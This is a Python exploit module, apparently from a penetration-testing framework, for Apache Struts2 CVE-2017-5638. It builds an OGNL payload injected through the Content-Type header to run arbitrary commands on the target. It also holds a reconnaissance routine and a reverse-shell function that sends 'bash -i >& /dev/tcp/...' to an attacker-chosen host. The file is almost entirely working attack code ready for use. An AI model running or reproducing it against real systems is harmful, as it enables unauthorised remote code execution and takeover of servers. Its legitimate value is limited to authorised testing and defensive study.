#!/usr/bin/env python3
"""
Apache Struts2 CVE-2017-5638 Exploit
====================================

Exploits the Apache Struts2 vulnerability CVE-2017-5638 (S2-045) which allows
remote code execution through crafted Content-Type headers in HTTP requests.

Author: Brainless Security Team
Module: exploits/linux/apache/struts2_cve_2017_5638
Type: exploit
Rank: excellent
"""

import os
import sys
import socket
import urllib.request
import urllib.parse
import urllib.error
from urllib.request import Request
from urllib.error import HTTPError, URLError
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Apache Struts2 - CVE-2017-5638"
DESCRIPTION = "Exploits Struts2 vulnerability CVE-2017-5638 for remote code execution"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "exploit"

class Struts2Exploit(LoggerMixin):
    """
    Exploits CVE-2017-5638 in Apache Struts2
    """
    
    def __init__(self):
        super().__init__('Struts2Exploit')
        self.target_url = None
        self.command = "whoami"
        self.timeout = 10
        self.verified = False
        
    def set_option(self, option: str, value: str):
        """Set module options"""
        if option.lower() == 'rhost':
            self.target_url = f"http://{value}"
        elif option.lower() == 'rport':
            if self.target_url:
                self.target_url = self.target_url.replace(
                    self.target_url.split(':')[1], f":{value}"
                )
            else:
                self.target_url = f"http://:{value}"
        elif option.lower() == 'target_url':
            self.target_url = value
        elif option.lower() == 'command':
            self.command = value
        elif option.lower() == 'timeout':
            self.timeout = int(value)
    
    def get_options(self) -> dict:
        """Get module options"""
        return {
            'RHOST': {'description': 'Target host IP or URL', 'required': True, 'default': ''},
            'RPORT': {'description': 'Target port (default: 80)', 'required': False, 'default': '80'},
            'TARGET_URL': {'description': 'Full target URL path', 'required': False, 'default': '/'},
            'COMMAND': {'description': 'Command to execute', 'required': False, 'default': 'whoami'},
            'TIMEOUT': {'description': 'Request timeout in seconds', 'required': False, 'default': '10'}
        }
    
    def create_malicious_header(self, command: str) -> str:
        """
        Create malicious Content-Type header for CVE-2017-5638
        """
        # OGNL payload to execute command
        payload = f"%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.dispatcher.HttpServletRequest@getCurrentRequest()).(#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('{command}').getInputStream()).useDelimiter('\\\\A')).(#str=#s.hasNext()?#s.next():'').(#s.close()).(#str)}}"
        
        return payload
    
    def check_vulnerability(self) -> bool:
        """
        Check if target is vulnerable to CVE-2017-5638
        """
        if not self.target_url:
            self.error("Target URL not specified")
            return False
        
        try:
            # Test with a simple command
            test_command = "echo VULNERABLE_TEST"
            malicious_header = self.create_malicious_header(test_command)
            
            # Create request
            req = Request(self.target_url)
            req.add_header('Content-Type', malicious_header)
            req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
            
            # Send request
            response = urllib.request.urlopen(req, timeout=self.timeout)
            response_code = response.getcode()
            
            if response_code == 200:
                self.info(f"Target appears vulnerable (HTTP {response_code})")
                self.verified = True
                return True
            else:
                self.warning(f"Target returned HTTP {response_code}")
                return False
                
        except HTTPError as e:
            if e.code == 500:
                self.info(f"Target may be vulnerable (HTTP 500)")
                self.verified = True
                return True
            else:
                self.warning(f"Target returned HTTP {e.code}")
                return False
        except URLError as e:
            self.error(f"URL Error: {e.reason}")
            return False
        except Exception as e:
            self.error(f"Error checking vulnerability: {e}")
            return False
    
    def execute_command(self, command: str) -> str:
        """
        Execute a command on the target system
        """
        try:
            malicious_header = self.create_malicious_header(command)
            
            # Create request
            req = Request(self.target_url)
            req.add_header('Content-Type', malicious_header)
            req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
            
            # Send request and get response
            response = urllib.request.urlopen(req, timeout=self.timeout)
            response_data = response.read().decode('utf-8', errors='ignore')
            
            return response_data
            
        except HTTPError as e:
            if e.code == 500:
                # Even with 500 error, command might have executed
                self.warning("Command may have executed despite HTTP 500 error")
                return ""
            else:
                self.error(f"HTTP Error {e.code}")
                return ""
        except Exception as e:
            self.error(f"Error executing command: {e}")
            return ""
    
    def get_system_info(self) -> dict:
        """
        Gather system information from the target
        """
        info = {}
        
        commands = {
            'os': 'uname -a',
            'user': 'whoami',
            'id': 'id',
            'pwd': 'pwd',
            'arch': 'arch',
            'hostname': 'hostname'
        }
        
        for key, cmd in commands.items():
            try:
                result = self.execute_command(cmd)
                info[key] = result.strip()
            except:
                info[key] = "N/A"
        
        return info
    
    def create_reverse_shell(self, lhost: str, lport: int) -> bool:
        """
        Create a reverse shell connection
        """
        try:
            # Create reverse shell command
            reverse_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            
            # Execute the reverse shell command
            result = self.execute_command(reverse_shell)
            
            self.info(f"Reverse shell command sent to {lhost}:{lport}")
            return True
            
        except Exception as e:
            self.error(f"Failed to create reverse shell: {e}")
            return False
    
    def run(self) -> dict:
        """
        Main exploit execution
        """
        if not self.target_url:
            return {'success': False, 'message': 'Target URL not specified'}
        
        try:
            self.info(f"Starting Struts2 exploit against {self.target_url}")
            
            # Check if target is vulnerable
            if not self.check_vulnerability():
                return {'success': False, 'message': 'Target does not appear to be vulnerable'}
            
            # Execute the specified command
            result = self.execute_command(self.command)
            
            if result:
                self.info("Command executed successfully")
                return {
                    'success': True,
                    'message': 'Exploit completed successfully',
                    'target': self.target_url,
                    'command': self.command,
                    'output': result,
                    'verified': self.verified
                }
            else:
                # Try to get system info as verification
                sys_info = self.get_system_info()
                return {
                    'success': True,
                    'message': 'Exploit executed but no output captured',
                    'target': self.target_url,
                    'command': self.command,
                    'system_info': sys_info,
                    'verified': self.verified
                }
                
        except Exception as e:
            self.error(f"Exploit execution failed: {e}")
            return {'success': False, 'message': f'Exploit failed: {str(e)}'}


def run(options: dict = None) -> dict:
    """
    Entry point for the exploit module
    """
    exploit = Struts2Exploit()
    
    # Set options if provided
    if options:
        for key, value in options.items():
            exploit.set_option(key, value)
    
    return exploit.run()


if __name__ == '__main__':
    # Example usage
    options = {
        'RHOST': '192.168.1.100',
        'RPORT': '8080',
        'TARGET_URL': '/struts2-showcase/',
        'COMMAND': 'whoami',
        'TIMEOUT': '10'
    }
    
    result = run(options)
    print(result)